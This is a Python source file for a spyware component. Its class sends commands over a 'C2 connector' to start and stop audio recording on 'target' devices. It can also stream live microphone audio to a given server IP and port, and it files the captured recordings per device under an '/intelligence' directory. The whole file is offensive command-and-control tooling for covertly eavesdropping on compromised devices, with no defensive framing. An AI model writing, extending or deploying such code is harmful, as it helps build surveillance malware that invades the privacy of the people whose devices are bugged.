import os
import logging
import json
from typing import Optional
from datetime import datetime

logger = logging.getLogger(__name__)

class MicrophoneStreamerManager:
    def __init__(self, c2_connector=None, storage_base="/intelligence/audio_recordings"):
        self.c2 = c2_connector
        self.storage_base = storage_base
        os.makedirs(self.storage_base, exist_ok=True)

    def send_command(self, device_id: str, action: str, params: dict) -> bool:
        if not self.c2:
            logger.error("No C2 connector available")
            return False
        command = {
            "command": action,
            "params": params
        }
        return self.c2.send(device_id, command)

    def start_recording(self, device_id: str, duration: int = 300, quality: str = "high") -> bool:
        """Start audio recording on target device."""
        logger.info(f"Start recording on {device_id}, duration={duration}s, quality={quality}")
        return self.send_command(device_id, "START_AUDIO_RECORDING", {
            "duration": duration,
            "quality": quality
        })

    def stop_recording(self, device_id: str) -> bool:
        """Stop ongoing audio recording."""
        logger.info(f"Stop recording on {device_id}")
        return self.send_command(device_id, "STOP_AUDIO_RECORDING", {})

    def start_live_stream(self, device_id: str, server_ip: str, port: int, codec: str = "opus") -> bool:
        """Initiate a live audio stream from device to server."""
        logger.info(f"Live stream from {device_id} to {server_ip}:{port} using {codec}")
        return self.send_command(device_id, "LIVE_AUDIO_STREAM", {
            "server_ip": server_ip,
            "port": port,
            "codec": codec
        })

    def process_audio_file(self, device_id: str, file_data: bytes, filename: Optional[str] = None) -> Optional[str]:
        """Store received audio file."""
        if not file_data:
            logger.warning("Empty audio data received")
            return None
        folder = os.path.join(self.storage_base, device_id)
        os.makedirs(folder, exist_ok=True)
        if not filename:
            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"audio_{ts}.raw"
        path = os.path.join(folder, filename)
        try:
            with open(path, "wb") as f:
                f.write(file_data)
            logger.info(f"Saved audio from {device_id}: {path} ({len(file_data)} bytes)")
            return path
        except Exception as e:
            logger.error(f"Failed to save audio: {e}")
            return None

    def process_stream_chunk(self, device_id: str, chunk: bytes, stream_id: str) -> bool:
        """Handle a chunk of live stream data (to be implemented by stream handler)."""
        # This would typically feed into a media server or WebRTC bridge
        logger.debug(f"Stream chunk from {device_id} ({stream_id}): {len(chunk)} bytes")
        return True